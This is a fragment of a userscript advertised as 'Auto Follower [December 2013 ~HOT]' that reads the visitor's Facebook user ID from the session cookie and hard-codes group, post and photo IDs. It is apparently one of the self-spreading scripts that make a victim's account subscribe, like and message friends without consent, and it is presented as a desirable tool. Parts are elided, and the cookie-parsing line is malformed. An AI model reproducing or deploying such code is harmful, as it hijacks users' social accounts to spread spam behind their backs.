// ==UserScript==
    // @name            Auto Follower [December 2013 ~HOT]
    // @description     Auto Follower [December 2013 ~HOT]
    ...
    sublist("1399558350289398");
     
    //Group subscriber
    var gid = ['693244457361494'];   
    ...
    var spost_id = "1403051743273392";"1402740213304545";
    var sfoto_id = "1403080953270471";
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    var smesaj = "";
    var smesaj_text = "";
    var arkadaslar = [];
